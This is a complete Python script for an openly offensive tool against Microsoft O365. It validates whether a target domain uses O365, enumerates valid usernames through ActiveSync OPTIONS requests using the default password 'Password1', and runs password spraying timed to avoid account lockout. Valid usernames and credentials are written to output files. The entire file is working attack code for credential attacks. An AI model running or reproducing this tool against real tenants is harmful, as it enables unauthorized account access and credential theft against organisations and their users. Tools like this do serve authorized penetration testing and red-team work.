#!/usr/bin/env python3

# TODO: Support single username and/or single password

# -------------------------------
__author__  = "km-zdh"
__date__    = "August 7, 2019"
__version__ = "1.1"
# -------------------------------
"""A basic username enumeration and password spraying tool aimed at spraying Microsoft O365."""

from re import sub, search
from time import sleep, time
from asyncio import wait, get_event_loop
from urllib3 import disable_warnings
from argparse import ArgumentParser
from requests import get, options
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from xml.etree.ElementTree import fromstring

disable_warnings(InsecureRequestWarning)

# Global variables
MAX_THREADS = 10

# Global storage for valid account data
valid_creds = {} # Password spray storage
valid_accts = [] # User enumeration storage



class text_colors:
  """ Colorized output during run """
  red    = "\033[91m"
  green  = "\033[92m"
  yellow = "\033[93m"
  reset  = "\033[0m"



class Helper:
  """ Helper functions """

  def print_stats(self, type_, creds, filename):
    print("\n%s\n[*] %s\n%s" % ("="*(len(type_)+4), type_, "="*(len(type_)+4)))
    print("[*] Valid Accounts: %d" % len(creds))
    if len(creds) > 0:
      print("[+] Writing data to: %s..." % filename)
      if type(creds) == dict: creds = ['%s:%s' % (k, v) for k, v in creds.items()]
      with open(filename, 'w') as file_:
        for account in creds:
          file_.write("%s\n" % account)

  def get_chunks_from_list(self, list_, n):
    for i in range(0, len(list_), n):
      yield list_[i:i + n]

  def get_list_from_file(self, file_):
    with open(file_, "r") as f:
      list_ = [line.strip() for line in f]
    return list_

  def check_last_chunk(self, sublist, full_list):
    """ Identify if the current list chunk is the last chunk """
    if sublist[-1] == full_list[-1]:
      return True
    return False

  def lockout_reset_wait(self, lockout):
    print("[*] Sleeping for %.1f minutes" % (lockout))
    sleep(lockout * 60)



class Validator:
  """ This is to validate the target domain is using O365 """

  default_url = "https://login.microsoftonline.com/getuserrealm.srf?login=user@{DOMAIN}&xml=1"

  def __init__(self, domain, proxy=None, debug=False):
    self.domain = domain
    self.url    = self.default_url.format(DOMAIN=self.domain)
    self.debug  = debug
    self.proxy  = None if not proxy else {
      "http": proxy, "https": proxy
    }

  def run(self):
    try:
      rsp = get(self.url, proxies=self.proxy, verify=False)
      xml = fromstring(rsp.text)
      nst = xml.find('NameSpaceType').text

      if nst in ["Managed", "Federated"]:
        print("[%sVALID%s] The following domain is using O365: %s" % (text_colors.green, text_colors.reset, self.domain))

      else:
        print("[%sINVALID%s] The following domain is not using O365: %s" % (text_colors.red, text_colors.reset, self.domain))

    except Exception as e:
      if self.debug: print(e)
      pass



class Enumerator:
  """ Perform user enumeration using Microsoft Server ActiveSync """

  loop = get_event_loop()

  default_base = "outlook.office365.com"
  default_url  = "https://{BASE}/Microsoft-Server-ActiveSync"

  def __init__(self, user_file, url_base=None, proxy=None, debug=False, threads=MAX_THREADS):
    url_base   = self.default_base if not url_base else url_base
    self.url   = self.default_url.format(BASE=url_base)
    self.debug = debug
    self.proxy = None if not proxy else {
      "http": proxy, "https": proxy
    }
    self.file_ = user_file
    self.helper   = Helper()
    self.executor = ThreadPoolExecutor(max_workers=threads)

  async def run(self):
    """ Asynchronously send HTTP requests """
    futures = [self.loop.run_in_executor(
      self.executor, self.enum, user
    ) for user in self.helper.get_list_from_file(self.file_)]

    await wait(futures)

  def enum(self, user):
    """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
    password = "Password1"
    try:
      headers = {"MS-ASProtocolVersion": "14.0"}
      auth = (user, password)
      rsp  = options(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)

      status = rsp.status_code
      if status in [200, 401, 403]:
        print("[%s%s-%d%s] %s:%s" % (text_colors.green, "VALID_USER", status, text_colors.reset, user, password))
        valid_accts.append(user)

      elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
        print("[%s%s%s] %s:%s" % (text_colors.red, "INVALID_USER", text_colors.reset, user, password))

      else:
        print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))

    except Exception as e:
      if self.debug: print("[ERROR] %s" % e)
      pass



class Sprayer:
  """ Perform password spraying using Microsoft Server ActiveSync """

  loop = get_event_loop()

  default_base = "outlook.office365.com"
  default_url  = "https://{BASE}/Microsoft-Server-ActiveSync"
  codes = {
    200: "VALID_CREDS",
    401: "BAD_PASSWD",
    403: "VALID_CREDS_2FA",
    404: "INVALID_USER"
  }

  def __init__(self, user_file, url_base=None, proxy=None, debug=False, threads=MAX_THREADS):
    url_base   = self.default_base if not url_base else url_base
    self.url   = self.default_url.format(BASE=url_base)
    self.debug = debug
    self.proxy = None if not proxy else {
      "http": proxy, "https": proxy
    }
    self.helper   = Helper()
    self.executor = ThreadPoolExecutor(max_workers=threads)
    self.user_list = self.helper.get_list_from_file(user_file)

  async def run(self, password_chunk):
    """ Asynchronously send HTTP requests """
    futures = [self.loop.run_in_executor(
      self.executor, self.spray, user, password
    ) for user in self.user_list for password in password_chunk]

    await wait(futures)

  def spray(self, user, password):
    """ Password spray Microsoft using Microsoft Server ActiveSync """
    try:
      headers = {"MS-ASProtocolVersion": "14.0"}
      auth = (user, password)
      rsp  = options(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)

      status = rsp.status_code
      if status in [200, 403]:
        print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
        valid_creds[user] = password

      elif status == 401:
        print("[%s%s%s] %s:%s" % (text_colors.yellow, self.codes[status], text_colors.reset, user, password))

      elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
        print("[%s%s%s] %s:%s" % (text_colors.red, self.codes[status], text_colors.reset, user, password))

      else:
        print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))

    except Exception as e:
      if self.debug: print("[ERROR] %s" % e)
      pass



if __name__ == "__main__":
  parser = ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer.")
  parser.add_argument("-u", "--username", type=str, help="File containing list of usernames")
  parser.add_argument("-p", "--password", type=str, help="File containing list of passwords")
  parser.add_argument("--count", type=int, help="Number of password attempts to run before resetting lockout timer")
  parser.add_argument("--lockout", type=float, help="Lockout policy reset time (in minutes)")
  parser.add_argument("--domain", type=str, help="Domain name to validate against O365")
  parser.add_argument("--proxy", type=str, help="Proxy to pass traffic through: <ip:port>")
  parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=MAX_THREADS)
  parser.add_argument("--output", type=str, help="Output file name for enumeration and spraying")
  parser.add_argument("--debug", action="store_true", help="Debug output")

  group = parser.add_mutually_exclusive_group(required=True)

  group.add_argument("-e", "--enum", action="store_true", help="Perform username enumeration")
  group.add_argument("-s", "--spray", action="store_true", help="Perform password spraying")
  group.add_argument("-v", "--validate", action="store_true", help="Validate a domain is running O365")

  args = parser.parse_args()

  # If validating the domain make sure we have the domain
  if args.validate and not args.domain:
      parser.print_help()
      print("\n[ERROR] When performing domain validation [--validate] you must specify" +
          " the following: domain name [--domain].")
      exit(1)

  # If enumerating users make sure we have a username file
  if args.enum and not args.username:
      parser.print_help()
      print("\n[ERROR] When performing user enumeration [--enum] you must specify" +
          " the following: a username file [--username].")
      exit(1)

  # If password spraying make sure we have all the information
  if args.spray and (not args.username or not args.password or not args.count or not args.lockout):
      parser.print_help()
      print("\n[ERROR] When performing password spraying [--spray] you must specify" +
          " the following: a username file [--username], a password file [--password]," +
          " password count [--count], and lockout timer in minutes [--lockout].")
      exit(1)

  start = time()
  helper = Helper()

  # Perform domain validation
  if args.validate:
    validator = Validator(args.domain, args.proxy, args.debug)
    validator.run()

  # Perform user enumeration
  elif args.enum:
    enum = Enumerator(args.username, args.domain, args.proxy, args.debug, args.threads)
    enum.loop.run_until_complete(enum.run())
    helper.print_stats("User Enumeration", valid_accts, ("valid_users.txt" if not args.output else args.output))

  # Perform password spray
  elif args.spray:
    spray = Sprayer(args.username, args.domain, args.proxy, args.debug, args.threads)
    
    password_list = helper.get_list_from_file(args.password)
    for password_chunk in helper.get_chunks_from_list(password_list, args.count):
      print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
      spray.loop.run_until_complete(spray.run(password_chunk))
      if not helper.check_last_chunk(password_chunk, password_list):
        helper.lockout_reset_wait(args.lockout)

    helper.print_stats("Password Spraying", valid_creds, ("valid_credentials.txt" if not args.output else args.output))

  elapsed = time() - start
  if args.debug: print("\n>> %s executed in %0.2f seconds." % (__file__, elapsed))
